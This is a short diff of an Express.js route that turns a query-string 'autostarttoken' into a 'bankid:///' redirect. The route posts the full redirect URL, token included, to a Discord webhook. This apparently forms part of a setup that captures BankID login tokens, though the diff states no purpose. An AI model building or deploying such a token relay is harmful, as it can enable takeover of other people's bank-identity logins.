@@ -13,18 +13,14 @@ app.use(express.json());
 
 app.get('/', (req, res) => {
   // Extract the autostarttoken parameter from the query string
-  const autostarttoken = req.query;
-
-  if (!autostarttoken) {
-    return res.status(400).send('Missing autostarttoken parameter');
-  }
+  const autostarttoken = req.query.autostarttoken;
 
   if (autostarttoken === "?") {
-    return res.status(200).send('Yes yes thats it!');
+    return res.status(200).send('Yes yes that\'s it!');
   }
 
   // Construct the redirect URL with formatted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}`;
+  const redirectUrl = `bankid:///?autostarttoken=${encodeURIComponent(autostarttoken)}`;
 
   // Log the redirect URL to Discord webhook (replace with your webhook function)
   sendDiscordWebhook(redirectUrl);
@@ -32,6 +28,7 @@ app.get('/', (req, res) => {
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
 
 
